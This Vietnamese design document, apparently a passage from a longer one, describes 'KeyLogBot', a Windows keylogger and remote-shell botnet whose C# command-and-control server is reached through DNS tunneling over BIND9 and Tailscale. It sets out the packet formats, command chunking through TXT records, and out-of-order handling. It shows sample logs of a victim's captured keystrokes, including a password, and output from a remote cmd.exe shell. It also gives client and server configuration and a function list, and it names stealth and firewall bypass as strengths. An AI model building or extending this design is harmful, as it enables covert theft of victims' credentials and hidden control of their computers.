### Xử lý Out-of-Order

**Client gửi**: `b.5.1.xxx` (packetNum=5)  
**Server expect**: packetNum > 4

**Nếu nhận `b.3.1.xxx`** (sau khi nhận 4):
```
Server:
  → PacketsOutOfOrderException
  → Response: 203.x.y.z

Client nhận 203:
  → Reset keylog_packetNumber = 0
  → Gửi lại với packetNum=0
```

### Duplicate Packets

**Nguyên nhân**: BIND9 hoặc network có thể forward query 2 lần

**Xử lý**:
```csharp
if (packetNum == _lastReceived) {
  throw DuplicatePacketException;
}

catch (DuplicatePacketException) {
  // Silently ignore, không response lỗi
  return CreateEmptyResponse();
}
```

---

## 💾 LOG FILE STRUCTURE

### Client logs directory
```
logs/
└── [Client IP]/
    ├── keylog_2025-12-21.txt
    ├── keylog_2025-12-22.txt
    ├── shell_2025-12-21.txt
    └── shell_2025-12-22.txt
```

### File format

**keylog_[date].txt**:
```
[14:30:15] Hello[BS][BS]llo World[ENTR]
[14:30:45] [^C][^V]dir[ENTR]
[14:31:00] password123[ENTR]
```

**shell_[date].txt**:
```
[14:30:45] C:\Users\Victim>dir
 Volume in drive C is OS
 Directory of C:\Users\Victim
...
>

[14:31:10] C:\Users\Victim>ipconfig
Windows IP Configuration
...
>
```

### Buffering logic

**Keylog**: 
- Buffer 50 ký tự trước khi ghi
- Flush khi shutdown

**Shell**:
- Buffer toàn bộ output của 1 lệnh
- Phát hiện prompt ">" → Ghi file
- Flush khi shutdown

---

## 🚦 COMMAND FLOW (Server → Client)

### Enqueue Command (từ UI)
```csharp
ServerLogic.EnqueueCommand(connectionId, "dir\n")
  └─> _commandQueues[connectionId].Enqueue("dir\n")
```

### Client Polling
```
Client gửi TXT query liên tục:
  p.0.0.1.domain (offset=0)
  p.0.1.1.domain (offset=1)
  p.0.2.1.domain (offset=2)
  ...
Sleep(5s) giữa các polling cycle
```

### Server Chunking
```csharp
Lần đầu client poll (offset=0):
  ├─> Lấy "dir\n" từ queue
  ├─> Tính totalChunks = ceil(4 / 60) = 1
  ├─> State: ("dir\n", 1, 0)
  ├─> chunk = "dir\n"
  ├─> hex = "6469720a"
  └─> Response TXT: "6469720a"

Client poll tiếp (offset=1):
  ├─> State vẫn tồn tại
  ├─> chunkStart = 1*60 = 60 > 4 (length)
  ├─> Remove state
  └─> Response TXT: "" (empty)

Client nhận TXT rỗng:
  └─> Biết đã nhận đủ
  └─> fullCommand = "dir\n"
  └─> EnqueueExecute()
```

**Lệnh dài (>60 chars)**:
```
Command: "echo " + ("A" * 100) + "\n"  (105 chars)
totalChunks = ceil(105 / 60) = 2

Poll 1 (offset=0):
  → chunk = chars[0:60]   → hex1 → TXT response

Poll 2 (offset=1):
  → chunk = chars[60:105] → hex2 → TXT response

Poll 3 (offset=2):
  → offset*60 >= 105 → Remove state → TXT: ""
```

---

## 🛡️ SHUTDOWN SEQUENCE

### Server Stop()
```csharp
Stop()
  ├─> [1] Gửi kill command đến tất cả clients
  │   └─> killAllConnections()
  │       └─> Enqueue taskkill command vào mọi queue
  │
  ├─> [2] Chờ clients poll và nhận lệnh (max 30s)
  │   └─> Loop kiểm tra:
  │       ├─> _commandQueues empty?
  │       └─> _commandChunkState empty?
  │
  ├─> [3] Dừng _udpServer
  ├─> [4] Flush logs
  │   └─> _clientManager.SaveAllLogs()
  │       └─> Gọi FlushLogs() cho mọi DataParser
  │
  └─> [5] LogMessage("[Stopped]")
```

### Client Cleanup
```cpp
Main.cpp - WinMain() exit:
  ├─> shouldStopSender = true
  ├─> WaitForSingleObject(hSenderThread, 5000)
  ├─> UnhookWindowsHookEx(_k_hook)
  ├─> CloseHandle(mutex)
  └─> Return
```

**Kill command từ server**:
```
Command: "taskkill /PID [System.exe PID] /F"
→ Client thực thi → Tự kill process
```

---

## 🔧 CONFIGURATION

### Client (Network.h)
```cpp
TARGET_DOMAIN = "example.test"
DNS_SERVER_IP = "100.111.111.100"  // Bind9 resolver
MAX_BUFFER = 10                     // Keylog buffer size
max_len = 30                        // Shell chunk size
```

### Server (ServerLogic.cs)
```csharp
_domain = "example.com"
_serverIp = "100.123.123.123"       // C&C IP
port = 53
logPath = "logs/"
```

### DataParser (DataParser.cs)
```csharp
KEYLOG_BUFFER_SIZE = 50  // Chars before writing
```

---

## 📈 PERFORMANCE CONSIDERATIONS

### Packet Size Limits

**DNS query max**: ~253 bytes  
**DNS label max**: 63 bytes

**Type B (keylog)**:
```
b.[pkt].[id].[HEXDATA].domain
Prefix: ~10 chars
Domain: ~15 chars
→ HEXDATA max: ~228 chars = 114 bytes original data
```

**Type C (shell)**:
```
c.[pkt].[off].[id].[HEXDATA].domain
max_len = 30 bytes → 60 hex chars
Safe trong DNS label limit
```

### Timing

**Client**:
- Keylog: Gửi ngay khi buffer đầy (10 chars)
- Shell poll: 5s giữa các cycle (sleep trong senderBotnetThread)
- DNS query timeout: Mặc định của Windows DNS client

**Server**:
- Xử lý mỗi query trong thread riêng (Task.Run)
- Không block nhau
- Log flush: Keylog mỗi 50 chars, Shell mỗi prompt

---

## 🔍 DEBUG MODE

**Client**:
```cpp
#ifdef _DEBUG
  AllocConsole();  // Tạo console window
  std::cout << "[DEBUG] ...";
#endif
```

**Xuất ra console**:
- Tailscale IP
- Connection ID
- Commands received
- Send failures

---

## 🎯 SUMMARY - ĐIỂM QUAN TRỌNG

1. **4 loại gói tin**: A (connect), B (keylog), C (shell), P (poll cmd)
2. **2 packet counters độc lập**: keylog_packetNumber vs botnet_packetNumber
3. **Chunking**: Type C và P hỗ trợ chia nhỏ dữ liệu
4. **Response codes**: Octet đầu của IP = status (200/201/202/203/204)
5. **TXT records**: Chỉ dùng cho type P (gửi lệnh)
6. **Buffering**: Keylog 50 chars, Shell đến khi gặp ">"
7. **Thread-safe**: Mutex bảo vệ queues và g_outChunk
8. **Tailscale**: Tạo mạng riêng, bypass firewall
9. **BIND9**: Forward protocol queries đến C&C, xử lý DNS bình thường
10. **Stealth**: Traffic giống DNS lookup thông thường

---

## 📚 DANH SÁCH FUNCTIONS THEO MODULE

### Client - Network.cpp
- `getLocalTailscaleIP()`: Lấy IP Tailscale
- `startConnection(domain)`: Kết nối, nhận ID
- `sendData(id, pkt, domain, data)`: Gửi type B
- `sendDataTypeC(id, pkt, off, domain, hex)`: Gửi type C
- `sendDataTypeP(id, pkt, off, domain)`: Poll type P
- `convertToHex(string)`: ASCII → hex

### Client - KeyLogger.cpp
- `process_key()`: Hook callback bàn phím
- `senderThread()`: Worker gửi keylog

### Client - Botnet.cpp
- `senderBotnetThread()`: Poll + gửi shell
- `handle_botnet()`: Thực thi lệnh
- `EnqueueSend()`: Thêm vào send_queue
- `EnqueueExecute()`: Thêm vào execute_queue

### Client - Shell.cpp
- `CreateSession()`: Tạo cmd.exe + pipes
- `ExecuteCommand(cmd)`: Ghi vào stdin
- `RedirectReadThread(pipe)`: Đọc stdout/stderr
- `Dispose()`: Dọn dẹp process

### Server - ServerLogic.cs
- `Start()`: Khởi động UDP server
- `ListenForQueries()`: Loop nhận queries
- `ProcessQuery()`: Xử lý từng query (core logic)
- `EnqueueCommand()`: Thêm lệnh vào queue
- `Stop()`: Shutdown + flush logs

### Server - ClientManager.cs
- `AddClient(ip)`: Tạo client mới
- `GetParser(id)`: Lấy DataParser
- `ConnectionExists(id)`: Kiểm tra tồn tại
- `GetConnectionIdByIp(ip)`: Tìm ID từ IP
- `SaveAllLogs()`: Flush tất cả

### Server - ProtocolHandler.cs
- `GetData(full)`: Trích protocol từ query
- `ParseDataPacket(data)`: Parse type B/C

### Server - DataParser.cs
- `AddDataByType()`: Thêm packet, check order
- `SaveDataByType()`: Buffer + ghi file
- `FlushLogs()`: Ghi remaining buffer

### Server - DNSParser.cs
- `ParseQuery(bytes)`: Parse DNS query

### Server - DNSResponseBuilder.cs
- `CreateSimpleAResponse()`: Tạo A response
- `CreateTXTResponse()`: Tạo TXT response
- `CreateEmptyResponse()`: Empty response

### Server - IPGenerator.cs
- `CreateStartIp(connections)`: IP cho connect
- `CreateResponseIp(code)`: IP cho status

---

## 🎓 KẾT LUẬN

Hệ thống KeyLogBot sử dụng DNS Tunneling qua Tailscale để che giấu traffic, vận hành với:

- **Client**: 3 threads xử lý keylog, shell polling, và execution
- **Server**: Event-driven UDP server với packet tracking, buffering thông minh
- **Protocol**: 4 loại gói tin (A/B/C/P), chunking, error handling
- **Storage**: Log files theo ngày, buffer để tối ưu I/O

**Luồng dữ liệu chính**:
1. Client kết nối (type A) → Nhận ID
2. Keylog gửi liên tục (type B) → Server lưu log
3. Client poll lệnh (type P) → Server gửi chunks
4. Client thực thi → Gửi output (type C) → Server lưu log

**Điểm mạnh**: Stealth, bypass firewall, dual-stream, error recovery  
**Điểm yếu**: Phụ thuộc DNS, latency cao, dễ phát hiện bằng DNS monitoring

---

**Tài liệu này mô tả đầy đủ kiến trúc, luồng dữ liệu, và chức năng của từng hàm trong hệ thống KeyLogBot.**
